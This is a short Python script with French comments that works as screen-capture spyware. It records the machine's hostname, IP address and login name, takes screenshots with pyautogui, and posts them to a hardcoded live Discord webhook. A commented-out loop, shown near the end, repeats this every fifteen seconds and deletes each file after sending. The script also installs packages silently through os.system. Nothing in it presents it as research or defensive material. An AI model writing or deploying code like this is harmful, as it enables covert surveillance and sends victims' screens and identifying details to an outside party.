import pyautogui
import requests
import os
import time
import socket

os.system('cmd /c "pip install --upgrade pyautogui && pip install --upgrade pillow')

hostname=socket.gethostname()
IPAddr=socket.gethostbyname(hostname)

try: 
    os.mkdir("./tmp") 
except OSError as error: 
    pass

# Fonction pour prendre un screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "./tmp/tmp8995425.png"
    screenshot.save(screenshot_path)
    return screenshot_path

# Fonction pour envoyer le screenshot à un webhook Discord
def send_to_discord(webhook_url, screenshot_path):
    files = {'file': open(screenshot_path, 'rb')}
    payload = {'content': 'Screenshot from '+os.getlogin()+" IP : "+IPAddr+" Domain : "+hostname}
    requests.post(webhook_url, files=files, data=payload)

# Remplacez 'YOUR_DISCORD_WEBHOOK_URL' par le véritable URL de votre webhook Discord
discord_webhook_url = 'https://discord.com/api/webhooks/1174066670596276356/qNzyNuYfnEhmiHZMjH8oi1nwyS-xykqzy9ZnjsP8R6WmTXf_VY808R5XPqI1yjKM5vbB'


# while True:
#     # Prend un screenshot
#     screenshot_path = take_screenshot()
#     # Envoie le screenshot au webhook Discord
#     send_to_discord(discord_webhook_url, screenshot_path)
#     # Supprime le fichier du screenshot après l'envoi (facultatif)
#     os.remove(screenshot_path)
#     time.sleep(15)
